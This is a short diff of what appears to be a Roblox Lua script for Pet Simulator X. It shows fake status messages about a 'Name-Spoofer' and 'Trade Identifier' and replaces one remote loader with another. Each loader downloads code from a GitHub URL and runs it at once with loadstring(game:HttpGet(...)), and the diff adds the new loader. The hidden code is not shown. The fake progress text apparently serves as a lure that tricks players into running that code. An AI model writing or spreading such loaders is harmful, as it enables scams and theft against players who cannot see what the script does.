@@ -6,4 +6,5 @@ _G.Text1 = "Determining Ping..."
 _G.Text2 = "Creating Trade Identifier..."
 _G.Text3 = "Checking Name-Spoofer..."
 _G.Text4 = "Name-Spoofer Working! Press Y + Shift at 100%!"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yolol10212/petsimx/main/Script"))()
+--SUDO ON TOP
